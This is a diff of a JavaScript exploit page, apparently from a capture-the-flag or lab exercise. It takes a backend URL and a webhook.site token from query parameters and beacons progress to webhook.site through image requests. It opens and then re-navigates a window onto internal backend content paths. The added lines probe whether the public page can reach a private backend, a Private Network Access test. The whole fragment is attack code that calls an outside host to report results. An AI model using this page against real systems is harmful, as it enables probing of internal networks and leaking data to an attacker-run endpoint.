@@ -13,7 +13,9 @@ const B = (q.get('b') || 'http://backend:8080').replace(/\/+$/,'');
 const P = '2';
 const WT = q.get('w') || '';
 function bx(s){ if(WT) new Image().src='https://webhook.site/'+WT+'/S?'+s+'&t='+Date.now(); }
-bx('step=loaded&ver=d3&B='+encodeURIComponent(B));
+bx('step=loaded&ver=d4&B='+encodeURIComponent(B));
+// PROBE: can this (public) page reach the backend at all? (PNA public->private test)
+fetch(B + '/', {mode:'no-cors'}).then(function(){ bx('probe=reach-ok'); }).catch(function(e){ bx('probe=reach-FAIL&e='+encodeURIComponent(''+e)); });
 const w = window.open(B + '/api/content/' + P + '/1', 'x');   // register RB (direct /1, no competing dict)
 setTimeout(function(){ bx('step=nav'); try { w.location = B + '/api/content/' + P + '/2'; } catch (e) {} }, 5000);
 </script>
